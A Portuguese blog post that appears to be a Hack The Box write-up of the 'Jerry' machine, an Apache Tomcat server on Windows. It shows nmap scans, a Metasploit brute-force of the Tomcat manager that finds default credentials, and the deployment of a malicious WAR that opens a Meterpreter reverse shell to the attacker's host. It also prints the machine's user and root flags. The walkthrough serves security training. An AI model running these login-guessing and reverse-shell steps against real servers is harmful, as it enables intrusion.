---
layout: post
title: Jerry [Hack The Box] - Explorando Apache Tomcat
author: obrerodrigues
categories: [CTFs]
tags: [Hack The Box, windows, tomcat]
---
Jerry é uma máquina windows nada díficil.

![](https://raw.githubusercontent.com/brerodrigues/brerodrigues.github.io/master/assets/img/jerry_htb.jpg)

Um scan do nmap padrão me fez desconfiar se estava mesmo conectado a vpn ou se tinha algo errado com minha conexão.

```
└──╼ $nmap -v -A  10.10.10.95 -oN nmap.txt
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-04 01:36 UTC
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 01:36
Completed NSE at 01:36, 0.00s elapsed
Initiating NSE at 01:36
Completed NSE at 01:36, 0.00s elapsed
Initiating Ping Scan at 01:36
Scanning 10.10.10.95 [2 ports]
Completed Ping Scan at 01:36, 3.00s elapsed (1 total hosts)
Nmap scan report for 10.10.10.95 [host down]
NSE: Script Post-scanning.
Initiating NSE at 01:36
Completed NSE at 01:36, 0.00s elapsed
Initiating NSE at 01:36
Completed NSE at 01:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.63 seconds
```

Mas, na verdade, o servidor estava bloqueando pings. Então usei -Pn.

```
└──╼ $nmap -v -A  10.10.10.95 -Pn -oN nmap.txt
# Nmap 7.70 scan initiated Tue Sep  4 00:34:18 2018 as: nmap -v -A -Pn -oN nmap.txt 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.22s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  4 00:34:57 2018 -- 1 IP address (1 host up) scanned in 38.80 seconds
```

Um servidor web apache tomcat. Acessando o http://10.10.10.95:8080 temos a mensagem que "If you're seeing this, you've successfully installed Tomcat. Congratulations!". É uma instalação padrão sem muito a oferecer. O botão "Server Status" nos leva ao link: http://10.10.10.95:8080/manager/status onde é listado que o servidor é um Windows Server 2012 R2, a versão do jvm e outras coisinhas. Informações que podem ser úteis no futuro.

Por alguns minutos procurei como configurações default do tomcat poderiam permitir uma hackeada e não encontrei algo interessante. O Dirbuster também não estava dando resultados.
Ok... Hora de pensar melhor. Estava com sono e apenas seguindo uns passos padrões tipo nmap, dirbuster e exploração de algo óbvio. Mas não é assim que se faz essa porra. Foi hora de dar um passo atrás e repensar no que tinha até o momento, afinal, pela avaliação da galera, essa máquina deveria ser fácilima. E a única coisa que parecia ser a porta de entrada era a o http://10.10.10.95:8080/manager. Claro que já havia tentado umas senhas padrão ridículas como admin/admin mas quem sabe não havia algo além? Em meio as minhas pesquisas em relação a essa página de login vi esse módulo auxiliar do metasploit: [https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login) e pensei: por que não?

```
msf > use auxiliary/scanner/http/tomcat_mgr_login
Description:
  This module simply attempts to login to a Tomcat Application Manager
  instance using a specific user/pass.
```

Nada mágico, apenas se usará uma lista de usuario/senha e tentará logar no application manager.
Setei os bagulhos do metasploit e botei o bicho para rodar enquanto pensava e pesquisava por outros meios de acesso.

```
msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOST 10.10.10.95
[!] RHOST is not a valid option for this module. Did you mean RHOSTS?
RHOST => 10.10.10.95
msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.10.10.95
RHOSTS => 10.10.10.95
msf auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
```

Eu realmente não acreditava que isso ia dar em algum lugar. Eles me ensinaram que ataques de força bruta são praticamente inúteis. Maldito livro proibido do curso de hacker!

```
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
[-] 10.10.10.95:8080 - LOGIN FAILED: both:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:manager (Incorrect)
```

Mas olhe só... O usuário tomcat usa a senha secreta s3cret. Agora sim temos algo útil.
Ao acessar o manager temos as aplicações que estão rodando no servidor e temos o poder de dar deploy em um arquivo war nosso. Em outras palavras: execução de código que com certeza será malicioso. Se você não sabe, deveria pesquisar sobre o que é um deploy em um servidor tomcat, como o java faz as coisas e os carais. Não seja um kiddie que vai setar as coisas no metasploit e sair rodando. Que seja. Foda-se. Na verdade, um kiddie não faria ideia do que fazer ao ver uma página como essa onde não dá pra upar seu c99.php. C99... Estou velho. Seja um kiddie, seja feliz. Vote 666 e desbloqueie o Enéas na urna eletrônica.

Agora sim essa máquina ficou fácil pra carai. E o metasploit, convenientemente, tem um outro módulo para fazer upload e executar um war maliciosissimo em um server que se tenha o usuário e senha: [https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload)

```
msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
HttpPassword => s3cret
msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
HttpUsername => tomcat
msf exploit(multi/http/tomcat_mgr_upload) > set RHOST 10.10.10.95
RHOST => 10.10.10.95
msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
RPORT => 8080
```

Sem esquecer do payload:

```
msf exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD windows/meterpreter_reverse_tcp
msf exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.10.14.200
```

E mandar um exploit.

```
msf exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.200:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying jA9Vn9pNZQ08eS3tHb8R21z1JcjF...
[*] Executing jA9Vn9pNZQ08eS3tHb8R21z1JcjF...
[*] Meterpreter session 1 opened (10.10.14.200:4444 -> 10.10.10.95:49194) at 2018-09-04 01:15:07 +0000
[*] Undeploying jA9Vn9pNZQ08eS3tHb8R21z1JcjF ...
```

Que coisa linda, rapaz.

Sem dificuldade, dentro da pasta C:\Users\Administrator\Desktop\flags> há o arquivo '2 for the price of 1.txt'

```
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,587,751,936 bytes free
```

Esqueci o comando para ler um arquivo no Windows, então voltei ao meterpreter só pra isso:

```
meterpreter > cat "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

Se tiver afim de ler o write-up de uma máquina menos fácil, dá uma sacada na [canape](https://brerodrigues.github.io/ctfs/favorites/canape-hack-the-box-write-up).
